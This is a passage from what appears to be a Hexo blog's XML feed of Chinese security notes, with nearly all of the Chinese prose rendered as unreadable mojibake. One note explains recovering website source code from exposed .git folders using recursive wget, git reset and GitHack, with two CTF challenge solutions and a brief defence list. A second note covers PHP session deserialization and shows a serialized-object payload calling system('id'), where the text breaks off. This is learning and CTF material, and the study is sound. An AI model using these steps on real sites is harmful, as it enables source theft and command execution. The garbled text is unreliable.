æš‚å­˜åŒºæ–‡ä»¶ï¼Œè®°å½•äº†ä¸‹ä¸€æ¬¡æäº¤æ—¶è¦åŒ…å«çš„æ–‡ä»¶ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æ¥è¯´ä¸€ä¸ª<code>git</code>ä»“åº“ä¼šå­˜åœ¨ä»¥ä¸‹ä¿©æ–‡ä»¶</p><ol><li>README.md ï¼ˆé¡¹ç›®ä»‹ç»ï¼‰</li><li><code>.gitignore</code> ï¼ˆé…ç½®åœ¨gitè¿›è¡Œæ–‡ä»¶è·Ÿè¸ªçš„æ—¶å€™å¿½ç•¥æ‰å“ªäº›æ–‡ä»¶ , ä»è¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä¹Ÿå¯ä»¥å¾—åˆ°ä¸€éƒ¨åˆ†ç½‘ç«™çš„ç›®å½•ç»“æ„ , æˆ–è€…ä¸€äº›æ—¥å¿—&#x2F;é…ç½®æ–‡ä»¶ç­‰æ•æ„Ÿæ–‡ä»¶ï¼‰</li></ol><h3 id="ä¸€èˆ¬æƒ…å†µä¸‹çš„å¼€å‘æµç¨‹"><a href="#ä¸€èˆ¬æƒ…å†µä¸‹çš„å¼€å‘æµç¨‹" class="headerlink" title="ä¸€èˆ¬æƒ…å†µä¸‹çš„å¼€å‘æµç¨‹"></a>ä¸€èˆ¬æƒ…å†µä¸‹çš„å¼€å‘æµç¨‹</h3><ol><li>åˆå§‹åŒ–ä»“åº“ , å¹¶å°†ä»“åº“æ‰˜ç®¡åœ¨<code>Coding</code>æˆ–è€…<code>Github</code>ä¸Š , ä¾¿äºè¿œç¨‹åä½œ&#x2F;å¤‡ä»½&#x2F;éƒ¨ç½²</li><li>åœ¨æœ¬åœ°è¿›è¡Œç½‘ç«™å¼€å‘ , å¹¶å®šæ—¶æäº¤<code>commit</code> , <code>push</code>åˆ°è¿œç¨‹æ‰˜ç®¡ç½‘ç«™</li><li>å½“ä¸€ä¸ªé˜¶æ®µçš„å¼€å‘å·®ä¸å¤šçš„æ—¶å€™ , éœ€è¦è¿œç¨‹ç™»é™†æœåŠ¡å™¨ , é€šè¿‡æ‰˜ç®¡ç½‘ç«™å†å°†å‘è¡Œç‰ˆç½‘ç«™<code>pull</code>åˆ°<code>Web</code>ç›®å½•ä¸‹</li><li>ç½‘ç«™æ­£å¸¸è¿è¡Œ</li></ol><p>è¿™é‡Œå½“ç½‘ç«™ç»´æŠ¤å¼€å‘äººå‘˜åœ¨ä»æ‰˜ç®¡ç½‘ç«™<code>pull</code>ä»£ç çš„æ—¶å€™ï¼Œä¹Ÿä¼šå°†è¿™ä¸ªå­˜å‚¨äº†æ‰€æœ‰ç‰ˆæœ¬ä¿¡æ¯çš„<code>.git</code>æ–‡ä»¶å¤¹ä¸‹è½½åˆ°æœåŠ¡å™¨çš„<code>Web</code>ç›®å½•ä¸‹ï¼Œå› æ­¤æ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç›®å½•å»ä¸‹è½½<code>git</code>æ–‡ä»¶å¤¹ï¼Œå¯ä»¥åˆ©ç”¨å…¶ä¸­å­˜å‚¨çš„ç‰ˆæœ¬æ§åˆ¶ä¿¡æ¯ï¼Œå®Œå…¨æ¢å¤ç½‘ç«™åå°çš„ä»£ç å’Œç›®å½•ç»“æ„</p><h2 id="å¦‚ä½•åˆ©ç”¨æ¼æ´"><a href="#å¦‚ä½•åˆ©ç”¨æ¼æ´" class="headerlink" title="å¦‚ä½•åˆ©ç”¨æ¼æ´"></a>å¦‚ä½•åˆ©ç”¨æ¼æ´</h2><h3 id="åˆ©ç”¨çˆ¬è™«"><a href="#åˆ©ç”¨çˆ¬è™«" class="headerlink" title="åˆ©ç”¨çˆ¬è™«"></a>åˆ©ç”¨çˆ¬è™«</h3><p>çˆ¬è™«çˆ¬å–æ•´ä¸ªgitç›®å½• (è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒåŸå§‹ , éœ€è¦å…·æœ‰ä¸€å®šçš„Gitç»éªŒ , å’Œä½¿ç”¨<code>Githack</code>è¿™ä¸ªå·¥å…·ç›¸æ¯” , æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„åœ°æ–¹å°±æ˜¯ , å¯ä»¥å®Œå…¨æ¨¡æ‹ŸæœåŠ¡å™¨ä¸Šçš„ä»£ç ç¯å¢ƒ , å¯ä»¥è·Ÿè¸ªåˆ°gitçš„æ¯ä¸€æ¬¡æäº¤ , ä½†æ˜¯<code>Githack</code>å¥½åƒåªå¯ä»¥å°†æºç æ¢å¤åˆ°æœ€è¿‘çš„ä¸€æ¬¡æäº¤ï¼Œè¿™é‡Œçš„å¥½å¤„è¿˜æœ‰å¯ä»¥å»æŸ¥çœ‹<code>git</code>çš„æäº¤æ—¥å¿— , è¿™ä¸ªæ—¥å¿—ä¿¡æ¯ä¸­ä¼šæœ‰å¼€å‘äººå‘˜å¯¹æ¯ä¸€æ¬¡<code>commit</code>çš„æè¿° , æ¯”å¦‚æŸä¸ªBUGçš„ä¿®å¤ç­‰ç­‰ , å¯¹äºè¿™äº›å’ŒBUGç›¸å…³çš„åœ°æ–¹ , å¯ä»¥æœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œç™½ç›’å®¡è®¡ , æœ‰å¯èƒ½è¿™ä¸ªBUGä¿®å¤äº†è¿˜ä¸å¦‚æ²¡ä¿®å¤ , å¯èƒ½ä¼šé€ æˆæ›´å¤§çš„æ¼æ´)</p><h4 id="å…·ä½“æ€è·¯"><a href="#å…·ä½“æ€è·¯" class="headerlink" title="å…·ä½“æ€è·¯"></a>å…·ä½“æ€è·¯</h4><ol><li>åˆ©ç”¨çˆ¬è™«é€’å½’ä¸‹è½½<code>.git</code>ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</li><li>åˆ©ç”¨gitå‘½ä»¤å¯¹ç½‘ç«™çš„commitå†å²è¿›è¡ŒæŸ¥çœ‹</li><li>åˆ©ç”¨gitå‘½ä»¤å¯¹ç½‘ç«™çš„æºç è¿›è¡Œæ¢å¤</li></ol><h4 id="å…·ä½“æ“ä½œ"><a href="#å…·ä½“æ“ä½œ" class="headerlink" title="å…·ä½“æ“ä½œ"></a>å…·ä½“æ“ä½œ</h4><p>æ¼”ç¤ºç½‘ç«™ : <a href="http://www.xxx.com/.git/">http://www.xxx.com/.git/</a></p><ol><li>åœ¨è™šæ‹Ÿæœºä¸­åˆ©ç”¨<code>wget</code>å¯¹è¯¥ç›®å½•è¿›è¡Œé€’å½’ä¸‹è½½(-r)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -r -p -np -k http://www.xxx.com/.git/<br>--recursiveï¼ˆé€’å½’ï¼‰<br>-k,  --convert-linksï¼ˆè½¬æ¢é“¾æ¥ï¼‰<br>-p,  --page-requisitesï¼ˆé¡µé¢å¿…éœ€å…ƒç´ ï¼‰<br>-np, --no-parentï¼ˆä¸è¿½æº¯è‡³çˆ¶çº§ï¼‰<br></code></pre></td></tr></table></figure><ol start="2"><li>ä¸‹è½½å®Œæˆå , è¿›å…¥ä¸‹è½½çš„ç½‘ç«™ç›®å½•</li><li>åˆ©ç”¨å‘½ä»¤ : <code>git log</code> æŸ¥çœ‹ç½‘ç«™çš„æäº¤è®°å½•</li><li>åˆ©ç”¨å‘½ä»¤ : <code>git reset --hard [log hash]</code> æ¢å¤åˆ°æŒ‡å®šç‰ˆæœ¬å· (ä¸€èˆ¬å¦‚æœåªéœ€è¦å¾—åˆ°æºç çš„è¯å°±æ¢å¤åˆ°æœ€è¿‘çš„ä¸€æ¬¡æäº¤)</li></ol><h4 id="å¦‚ä½•é˜²å¾¡"><a href="#å¦‚ä½•é˜²å¾¡" class="headerlink" title="å¦‚ä½•é˜²å¾¡"></a>å¦‚ä½•é˜²å¾¡</h4><ol><li>å¯¹.gitç›®å½•çš„è®¿é—®æƒé™è¿›è¡Œæ§åˆ¶</li><li>åœ¨æ¯æ¬¡pullåˆ°webç›®å½•ä¸‹ä¹‹ååˆ é™¤.gitæ–‡ä»¶å¤¹</li></ol><h3 id="åˆ©ç”¨GitHackè„šæœ¬"><a href="#åˆ©ç”¨GitHackè„šæœ¬" class="headerlink" title="åˆ©ç”¨GitHackè„šæœ¬"></a>åˆ©ç”¨<code>GitHack</code>è„šæœ¬</h3><p><code>GitHack</code>æ˜¯ä¸€ä¸ª<code>.git</code>æ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„<code>.git</code>æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚</p><p><code>GitHack</code>è„šæœ¬ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h4 id="GitHackè„šæœ¬çš„å·¥ä½œåŸç†"><a href="#GitHackè„šæœ¬çš„å·¥ä½œåŸç†" class="headerlink" title="GitHackè„šæœ¬çš„å·¥ä½œåŸç†"></a><code>GitHack</code>è„šæœ¬çš„å·¥ä½œåŸç†</h4><ol><li>è§£æ<code>.git/index</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 )</li><li>å»<code>.git/objects/</code>æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶</li><li>ä½¿ç”¨<code>zlib</code>è§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç </li></ol><h4 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GitHack.py http://www.example.com/.git/     <span class="hljs-comment">#åˆ«å¿˜äº†æœ€åçš„.git</span><br></code></pre></td></tr></table></figure><p>è¿˜åŸåçš„æ–‡ä»¶åœ¨ <strong><code>dist/</code></strong> ç›®å½•ä¸‹</p><h4 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h4><ol><li>å°è¯•è·å– <code>packs</code>å…‹éš†</li><li>å°è¯•ç›®å½•éå†å…‹éš†</li><li>å°è¯•ä»ç¼“å­˜æ–‡ä»¶(index)ã€commitè®°å½•ä¸­æ¢å¤</li></ol><h1 id="CTFåšé¢˜å®æˆ˜"><a href="#CTFåšé¢˜å®æˆ˜" class="headerlink" title="CTFåšé¢˜å®æˆ˜"></a>CTFåšé¢˜å®æˆ˜</h1><h2 id="é¢˜ç›®ä¸€"><a href="#é¢˜ç›®ä¸€" class="headerlink" title="é¢˜ç›®ä¸€"></a>é¢˜ç›®ä¸€</h2><p>é¢˜ç›®æ¥æº</p><blockquote><p><a href="https://ctf.show/challenges#%E7%BB%99%E5%A5%B9-119"><code>ctfshow</code> èŒæ–°èµ› ç»™å¥¹</a></p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214346166.png" alt="image-20250330214346166"></p><p>çœ‹ç€æ˜¯è¦SQLæ³¨å…¥ï¼Œä½†å®é™…ä¸Šæ˜¯è¦è¿›è¡Œ<code>.git</code>æ³„éœ²ï¼Œè¿™é‡Œç”¨<code>GitHack</code>è„šæœ¬è¿›è¡Œæ³„éœ²</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> GitHack.py https://<span class="hljs-number">6</span>d6e5822-a557-<span class="hljs-number">4</span>a9a-<span class="hljs-number">96</span>c9-<span class="hljs-number">4</span>a46aacb1c63.challenge.ctf.show/.git/<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214644843.png" alt="image-20250330214644843"></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214714870.png" alt="image-20250330214714870"></p><p>å¯ä»¥çœ‹åˆ°æºç ä¸‹è½½åˆ°äº†è¿™ä¸ª<code>hint.php</code>æ–‡ä»¶ä¸­äº†ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè€ƒæŸ¥<code>sprintf</code>æ¼æ´ï¼Œä¹‹åçš„è§å¦ä¸€ä¸ªç¬”è®°<code>sprintfæ¼æ´</code></p><h2 id="é¢˜ç›®äºŒ"><a href="#é¢˜ç›®äºŒ" class="headerlink" title="é¢˜ç›®äºŒ"></a>é¢˜ç›®äºŒ</h2><p>é¢˜ç›®æ¥æº</p><blockquote><p>NSSCTFâ€“gitæ³„éœ²</p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132139456.png" alt="image-20250331132139456"></p><p>åˆ©ç”¨<code>GitHack</code>è„šæœ¬ä¸‹è½½å¾—åˆ°æºç </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> GitHack.<span class="hljs-keyword">py</span> http://node4.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28510</span>/.git/<br></code></pre></td></tr></table></figure><p>æºç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs HTML5">&lt;?php<br>if ($_GET[&#x27;wher3&#x27;] === &#x27;nssc7f&#x27;) &#123;<br>    echo getenv(&#x27;FLAG&#x27;);<br>&#125;<br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;title&gt;NSSCTF | .gitæ³„éœ²&lt;/title&gt;<br><br>&lt;/html&gt;<br><br>&lt;body&gt;flagåœ¨å“ªé‡Œï¼Ÿ&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132315777.png" alt="image-20250331132315777"></p>]]></content>
    
    
    <categories>
      
      <category>ä¿¡æ¯æœé›†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¿¡æ¯æœé›† Gitæºç æ³„éœ²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sessionååºåˆ—åŒ–</title>
    <link href="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†â€”session"><a href="#å‰ç½®çŸ¥è¯†â€”session" class="headerlink" title="å‰ç½®çŸ¥è¯†â€”session"></a>å‰ç½®çŸ¥è¯†â€”session</h1><p>å½“<code>session_start()</code>è¢«è°ƒç”¨æˆ–è€…<code>php.ini</code>ä¸­<code>session.auto_start</code>ä¸º1æ—¶ï¼ŒPHPå†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ·<code>session</code>è¢«åºåˆ—åŒ–åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º<code>/tmp</code>ï¼‰</p><p>å­˜å–æ ¼å¼æœ‰å¤šç§ï¼Œå¸¸è§çš„æœ‰å¦‚ä¸‹ä¸‰ç§ï¼Œä¸»è¦æ˜¯å‰ä¿©</p><table><thead><tr><th>å¤„ç†å™¨</th><th>å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th></tr></thead><tbody><tr><td><code>php</code></td><td>é”®å + ç«–çº¿ + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr><tr><td><code>php_serialize</code></td><td>ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td></tr><tr><td><code>php_binary</code></td><td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡<code>serialize()</code>å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr></tbody></table><p>**æ¼æ´äº§ç”Ÿï¼š**å†™å…¥æ ¼å¼å’Œè¯»å–æ ¼å¼ä¸ä¸€è‡´</p><p>å¦‚ä¸‹ä¸€å¥è¯å¯ä»¥æœ‰å¤šç§è¯»å–æ–¹å¼</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png" alt="image-20250420181040224"></p><h2 id="phpæ–¹å¼å­˜å‚¨"><a href="#phpæ–¹å¼å­˜å‚¨" class="headerlink" title="phpæ–¹å¼å­˜å‚¨"></a><strong><code>php</code>æ–¹å¼å­˜å‚¨</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆšå¼€å§‹å¯ä»¥çœ‹åˆ°<code>/tmp</code>ç›®å½•ä¸‹æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰çš„</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181844079.png" alt="image-20250420181844079"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=123456<br></code></pre></td></tr></table></figure><p>å½“ä»¥GETå½¢å¼æäº¤å‚æ•°<code>ben</code>åï¼Œå†æ¬¡æŸ¥çœ‹ä¼šå‡ºç°ä¸€ä¸ª<code>sess</code>æ–‡ä»¶ï¼Œå­˜å‚¨çš„æ˜¯åˆšæ‰æäº¤å†…å®¹ï¼Œæ ¼å¼ä¸º</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183509582.png" alt="image-20250420183509582"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># é”®å + ç«–çº¿ + ç»è¿‡åºåˆ—åŒ–å¤„ç†åçš„æ•°æ®</span><br>benben|s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹æ˜¯ä½¿ç”¨<code>php</code>æ ¼å¼è¿›è¡Œå‚¨å­˜</p><h2 id="php-serializeæ–¹å¼å­˜å‚¨"><a href="#php-serializeæ–¹å¼å­˜å‚¨" class="headerlink" title="php_serializeæ–¹å¼å­˜å‚¨"></a><code>php_serialize</code>æ–¹å¼å­˜å‚¨</h2><p>å¦‚æœè¦ä½¿ç”¨è¿™ä¸ªæ ¼å¼è¿›è¡Œå­˜å‚¨ï¼Œé¦–å…ˆè¦è¿›è¡Œä¸€ä¸ªå£°æ˜ï¼Œå£°æ˜å­˜å‚¨æ ¼å¼ä¸º<code>php_serialize</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>GETæäº¤ä¸¤ä¸ªå‚æ•°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=dazhunag&amp;b=666<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183339176.png" alt="image-20250420183339176"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="php-binaryæ–¹å¼å­˜å‚¨"><a href="#php-binaryæ–¹å¼å­˜å‚¨" class="headerlink" title="php_binaryæ–¹å¼å­˜å‚¨"></a><code>php_binary</code>æ–¹å¼å­˜å‚¨</h2><p>å’Œ<code>php_serialize</code>æ–¹å¼å­˜å‚¨ä¸€æ ·ï¼Œè¦å…ˆå£°æ˜å­˜å‚¨æ ¼å¼ä¸º<code>php_binary</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">benben</span>=dazhuang&amp;b=666<br></code></pre></td></tr></table></figure><p>éœ€è¦ç”¨äºŒè¿›åˆ¶çš„æ–¹å¼æŸ¥çœ‹</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420184444560.png" alt="image-20250420184444560"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br>ACKbenbens:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;SOHbs:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;<br></code></pre></td></tr></table></figure><p>å‰é¢çš„<code>ACK</code>å¯¹åº”çš„å°±æ˜¯<code>06</code>ï¼ˆé”®å<code>benben</code>çš„é•¿åº¦ï¼‰ï¼Œ<code>SOH</code>æ˜¯<code>01</code>ï¼ˆé”®å<code>b</code>çš„é•¿åº¦ï¼‰</p><h1 id="PHP-sessionååºåˆ—åŒ–æ¼æ´"><a href="#PHP-sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHP sessionååºåˆ—åŒ–æ¼æ´"></a>PHP sessionååºåˆ—åŒ–æ¼æ´</h1><p>**æ¼æ´æˆå› ï¼š**å½“ç½‘ç«™åºåˆ—åŒ–å¹¶å­˜å‚¨<code>session</code>ï¼Œä¸ååºåˆ—åŒ–å¹¶è¯»å–<code>session</code>çš„æ–¹å¼ä¸åŒæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´<code>session</code>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ</p><p>å¦‚ä¸‹ä¸¤ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªé¡µé¢å¦‚ä¸‹ï¼Œå¯ä»¥ä»¥<code>php_serialize</code>çš„æ–¹å¼å†™è¿›å»è¿›è¡Œå­˜å‚¨</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190424176.png" alt="image-20250420190424176"></p><p>ç¬¬äºŒä¸ªé¡µé¢å¦‚ä¸‹ï¼Œå¯ä»¥ä»¥<code>php</code>çš„æ–¹å¼è¿›è¡Œè¯»å–</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190441210.png" alt="image-20250420190441210"></p><p>åœ¨ç¬¬äºŒä¸ªé¡µé¢å¯ä»¥é€šè¿‡åºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420185635290.png" alt="image-20250420185635290"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span 